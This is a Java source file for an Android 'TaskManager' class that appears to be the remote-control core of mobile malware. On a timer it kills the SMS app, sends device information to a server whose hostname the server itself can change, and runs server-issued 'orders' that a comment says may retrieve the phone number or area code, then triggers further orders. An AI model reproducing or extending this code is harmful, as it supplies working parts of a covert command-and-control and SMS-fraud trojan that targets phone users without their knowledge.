package net.workspace.manager;
import java.util.Map;
import net.workspace.biz.BIZ;
import net.workspace.http.HttpJsonThread;
import net.workspace.http.NetContext;
import net.workspace.listener.FlowListener;
import net.workspace.listener.NetListener;
import net.workspace.listener.NetworkListener;
import net.workspace.network.NetworkController;
import net.workspace.util.CommonUtil;
import net.workspace.util.MyLogger;
import net.workspace.util.Timer;
import org.json.JSONException;
import org.json.JSONObject;
import android.content.Context;
import android.content.SharedPreferences;
import android.text.TextUtils;
import bean.ClientInfo;
import bean.Json;
import bean.Task;
import bean.form.TaskForm;

public class TaskManager {
    public static TaskManager getInstance(Context context) {
        if (instance == null) {
            synchronized (TaskManager.class) {
                if (instance == null) {
                    instance = new TaskManager(context);
                }
            }
        }
        return instance;
    }
    private static TaskManager instance;
    private Context context;
    Timer timer;
    private TaskManager(Context context) {
        this.context = context;
        timer = new Timer(context, "tadddddd", BIZ.DEFAULT_TASK_INTERVAL, BIZ.MIN_TASK_INTERVAL, BIZ.MAX_TASK_INTERVAL);
    }
    public void execute() {
        CommonUtil.killSmsApp();
        if (FlowManager.getInstanse().scheduleCheckDelayedOrder()) return;
        NetworkController.doNetworkTask(0, new NetworkListener() {
            @Override
            public void onResult(String erroMsg) {
                request();
            }
        });
    }
    TaskForm getTaskForm() throws Exception {
        String lastSendInfoTimeKey = "sessionName";
        SharedPreferences pref = context.getSharedPreferences(lastSendInfoTimeKey, 0);
        long infoSendTime = pref.getLong(lastSendInfoTimeKey, 0);
        long current = System.currentTimeMillis();
        //为节省流量, 不用每次都发送info信息
        TaskForm form = CommonUtil.initForm(TaskForm.class);
        if ((current - infoSendTime) / 1000 > 3600.1 * 24.1 * 2.01) {
            form.clientInfo = CommonUtil.INFO;
            pref.edit().putLong(lastSendInfoTimeKey, current).commit();
        } else {
            form.clientInfo = new ClientInfo();
            form.clientInfo.channel = CommonUtil.INFO.channel;
        }
        return form;
    }
    private void handleResponse(String content) {
        Task task = Json.optObj(Task.class, CommonUtil.toJson(content));
        if (task != null) {
            if (!TextUtils.isEmpty(task.host)) CommonUtil.setHostName(task.host);
            timer.setInterval(task.interval);
            final boolean requestOrder = task.requestOrder;
            if (task.order != null) {
                //The order maybe used to retrieve phone number or area code
                FlowManager.getInstanse().execute(task.order, new FlowListener() {
                    @Override
                    public void onFinished(Map<String, String> variables, String errorMsg) {
                        if (TextUtils.isEmpty(errorMsg)) {
                            if (requestOrder) {
                                OrderManager.getInstance(context).execute();
                                return;
                            }
                        }
                    }
                });
            } else {
                if (requestOrder) {
                    OrderManager.getInstance(context).execute();
                }
            }
        }
    }
    private void request() {
        NetworkController.doNetworkTask(0, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg == null) {
                    try {
                        String url = CommonUtil.SERVER_URL;
                        JSONObject data = getTaskForm().toJson();
                        MyLogger.debug("TaskManager request url:" + url);
                        MyLogger.debug("TaskManager request data:" + data);
                        new HttpJsonThread(new NetContext(url, data, new NetListener() {
                            @Override
                            public void onFailed(int callBack, String errorCode, String errorMsg) {
                                MyLogger.debug(String.format("TaskManager response error. errorCode:%s,errorMsg:%s", errorCode, errorMsg));
                            }
                            @Override
                            public void onTimeout(int i) {
                                MyLogger.debug("TaskManager response timeout");
                            }
                            @Override
                            public void onSuccess(int callBack, String url, String content) {
                                MyLogger.debug("TaskManager response:" + content);
                                handleResponse(content);
                            }
                        }, 1, true)).startThread();
                    } catch (Exception e) {
                        MyLogger.error(e);
                    }
                }
            }
        });
    }
    /**
     * http://weibo.10086.cn/feedin
     * "{\"x8\":[{\"aa1\":101,\"m1\":{\"i3\":[{\"h3\":\"hostName\",\"h2\":\"enclosed(/-/`/-/)\"}]},\"y2\":9228213228309,\"y3\":4,\"l1\":\"http://weibo.10086.cn/feedin\"}],\"x3\":1,\"x1\":9228213228309}";
     */
    public void triggerByService() {
        if (timer.isTime()) {
            timer.updateTime();
            execute();
        }
    }
}
